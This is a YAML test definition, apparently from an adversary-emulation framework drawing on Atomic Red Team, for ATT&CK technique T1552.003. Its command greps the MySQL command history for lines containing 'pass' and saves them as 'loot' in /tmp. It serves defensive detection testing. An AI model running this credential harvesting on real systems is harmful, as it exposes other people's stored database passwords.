- id: ce64e135-f186-4c4a-85da-75f6ef71e46f
  name: Search Through SQL History
  description: Search through SQL command line history for specific commands we want
    to capture
  tactic: credential-access
  technique:
    attack_id: T1552.003
    name: 'Unsecured Credentials: Bash History'
  platforms:
    linux:
      sh:
        command: cat ~/.mysql_history | grep -e 'pass' > /tmp/loot.txt
        cleanup: 'rm -f #{output_file}'
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - t1552.003
  - atomic-red-team
  - credential-access
  author: Atomic Red Team
  additional_info:
    input_arguments:
      output_file:
        description: Path where captured results will be placed
        type: path
        default: /tmp/loot.txt
      sql_history_grep_args:
        description: grep arguments that filter out specific commands we want to capture
        type: string
        default: -e 'pass'
      sql_history_filename:
        description: Path of the sh history file to capture
        type: path
        default: ~/.mysql_history
